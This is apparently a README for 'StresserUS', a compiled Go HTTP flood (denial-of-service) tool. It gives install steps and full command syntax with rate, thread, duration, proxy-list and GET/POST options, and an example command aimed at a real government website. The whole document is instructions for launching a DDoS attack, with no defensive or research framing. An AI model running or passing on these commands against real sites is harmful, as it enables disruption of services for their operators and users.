# StresserUS-httpflood
golang httpflood compiled

# HOW TO USE
```
apt install golang-go
chmod +x StresserUS 
```

# CMD USAGE
```
./StresserUS version=2 host=<url> limit=<rate> time=<time> list=<proxyfile> threads=<thread> mode=<GET/POST> cookie=<ddos=true> data=<post=true>
```
# EXAMPLE
```
./StresserUS version=2 host=https://www.fbi.gov/ limit=64 time=300 list=http.txt threads=60 mode=GET
```
